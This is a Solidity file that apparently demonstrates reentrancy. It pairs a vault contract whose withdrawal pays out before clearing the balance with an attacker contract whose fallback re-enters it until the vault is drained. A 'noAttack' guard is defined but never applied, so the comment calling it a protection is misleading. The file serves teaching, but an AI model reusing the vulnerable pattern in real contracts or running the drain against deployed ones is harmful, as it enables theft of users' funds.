// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract debug {

    // Mapps the token amounts with the address
    mapping(address => uint) public balances;

    // This bool and the modifier prevent the Reentrancy Attack
    bool started = false;

    modifier noAttack() {
        require(!started, "You can't loop through taking out funds");
        started = true;
        _;
        started = false;
    }

    // Show the balances of the wallet address which deposit the amount
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Create Reentrancy Attack function
    function takeOut() public {
        // Check wether the caller of the takeOut() has deposit some tokens in the auction contract
        require(balances[msg.sender] != 0);

        // With the .call method we can transfer tokens and create a temp var tryToSend to check later wether the amount has been refunded
        (bool tryToSend, ) = msg.sender.call{value: balances[msg.sender]}("");
        // Here starts the ATTACK!
        // After calling the .call method the fallback() from the Hack contract gets called every time until this contract has lost all the tokens
        
        // AFTER ATTACK HAPPENED - check whether the amount has refunded
        require(tryToSend);

        // Deposits of the address gets reset to 0 because the amount is resent to the previeous highestBidder 
        // After the Reentrancy attack happened the vault contract shows still the balance of the attack contract
        balances[msg.sender] = 0;
    }
}

contract Reentrancy_attack {
    // Refferencing the vault contract and set a new var as theVault
    debug public theVault;

    // Sets the address of the auction contract 
    constructor(address _address) {
        theVault = debug(_address);
    }

    // exploit() calls the fallback() with the loop to trick the takeOut() from the vault contract
    function exploit() public payable {
        
        // Not and exploit but starts the exploit
        // theVault.deposit - Calling the deposit() from vault controct with the given amount what the attack contract has deposited
        theVault.deposit{value: msg.value}();

        // Calling the takeOut() from vault controct to take out the deposited amount from the attack contract
        theVault.takeOut();
    }

    // fallback opens the door for the Reentrancy attack
    fallback() external payable {
        // address(theVault).balance - checks the balance in the vault contract on the given address and check whether it's bigger than 1 ether
        if(address(theVault).balance >= 1 ether) {
            // This if statement checks whether there is still tokens in the vault contract
            // If there are still tokens in the vault contract, the takeOut() from the vault contract gets called again until it's not true anymore
            theVault.takeOut();
        }
        // If the if statement is false - there aren't anymore tokens in the vault contract left
    }
}